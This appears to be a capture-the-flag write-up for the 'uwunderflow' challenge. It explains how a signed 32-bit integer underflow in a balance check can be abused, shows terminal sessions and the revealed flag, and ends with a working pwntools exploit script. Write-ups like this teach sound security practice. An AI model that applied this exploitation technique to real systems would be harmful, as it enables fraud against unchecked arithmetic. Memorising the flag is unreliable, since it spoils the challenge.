# uwunderflow

## Challenge

If we run the binary or connect to the server using netcat, we are greeted with this menu:

```
[1] Buy flag ($13371337)
[2] Buy uwus ($16)
Your balance: 100
```

We cannot buy flags as we do not have sufficient balance, but we can buy a limited number of uwus:

```
[1] Buy flag ($13371337)
[2] Buy uwus ($16)
Your balance: 100
1
You don't have enough money :(
[1] Buy flag ($13371337)
[2] Buy uwus ($16)
Your balance: 100
2
How many uwus do you want to buy?
2
You bought 2 uwus
[1] Buy flag ($13371337)
[2] Buy uwus ($16)
Your balance: 68
```

If we successfully buy a flag, the program will print the flag for us:

```c
void buyFlag() {
    if (balance < FLAG_COST) {
        puts("You don't have enough money :(");
        return;
    }

    balance -= FLAG_COST;
    puts(flag);
}
```

However, there does not appear to be a way to increase our balance.
The only change we can make to our balance is subtracting from it to buy uwus.

We also can't buy negative uwus:

```c
if (num < 0) {
    puts("You can't buy negative uwus >:(");
    return;
}
```

And we can't buy a number that would give us a negative balance:

```c
int newBalance = balance - (num * UWU_COST);

if (newBalance < 0) {
    puts("You don't have enough money :(");
    printf("Your new balance would be $%d\n", newBalance);
    return;
}

balance = newBalance;
```

```
[1] Buy flag ($13371337)
[2] Buy uwus ($16)
Your balance: 100
2
How many uwus do you want to buy?
10
You don't have enough money :(
Your new balance would be $-60
[1] Buy flag ($13371337)
[2] Buy uwus ($16)
Your balance: 100
```

## Solution

Let's focus on the `buyUwus` function, as this is the only way we can change our balance
(aside from buying a flag).

As stated above, we can buy a number of uwus that leaves us with a non-negative balance.
If we buy uwus that leave us with a negative balance, this function will fail.
This is to prevent us from buying more uwus than we can afford to.

However, note that there is a difference between what the program is trying to prevent,
and what the program is actually checking for.
In this case, as long as we end up with a non-negative balance, we can buy any number of uwus we want.

Recall that an integer is stored as 32 bits and represents negative bits using twos-complement.
Our initial balance (100) is stored as:

```
00000000 00000000 00000000 01100100
```

If we somehow end up with a balance of -1, it would be stored as:

```
11111111 11111111 11111111 11111111
```

The most significant bit indicates that the value is negative.
The larger the number of uwus we buy, the more negative this number becomes.

For example, if we spent 128 more, we would have a balance of -129, which is:

```
11111111 11111111 11111111 01111111
```

Note that we just changed a single bit from 1 to 0.
We can change any bit of this number by subtracting a specific value.

What if we were to change the sign bit which indicates the number is negative?

To change this, we subtract 2^31 (2147483648) from an already negative number.
For example, if we subtract from the number above, we get:

```
01111111 11111111 11111111 01111111
```

This actually becomes a very large positive number (2147483519)!
This is the result of integer underflow,
as the result would have exceeded the lower bound of a 32-bit number.
The data type cannot store such a negative number and it wraps around to the maximum positive number.

So to get from our original balance (100) to a larger positive number,
we must spend enough to get a negative balance (101), plus 2^31 to flip the sign bit.
This means we need to spend a minimum of 2147483748.

Each uwu costs 16, so we need to buy at least 134217735 uwus to get a larger positive balance.

```
[1] Buy flag ($13371337)
[2] Buy uwus ($16)
Your balance: 100
2
How many uwus do you want to buy?
134217735
You bought 134217735 uwus
[1] Buy flag ($13371337)
[2] Buy uwus ($16)
Your balance: 2147483636
```

We now have a huge positive balance and we can buy the flag.

```
You bought 134217735 uwus
[1] Buy flag ($13371337)
[2] Buy uwus ($16)
Your balance: 2147483636
1
maple{Uwuniveristy_of_BC}
```

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 uwunderflow
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('uwunderflow')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

uwus = str((2**31 + 100) // 16 + 1).encode()

io.sendlineafter(b"Your balance:", b"2")
io.sendlineafter(b"How many uwus do you want to buy?\n", uwus)
io.sendlineafter(b"Your balance:", b"1")

io.interactive()
```

## Flag

```
maple{Uwuniveristy_of_BC}
```
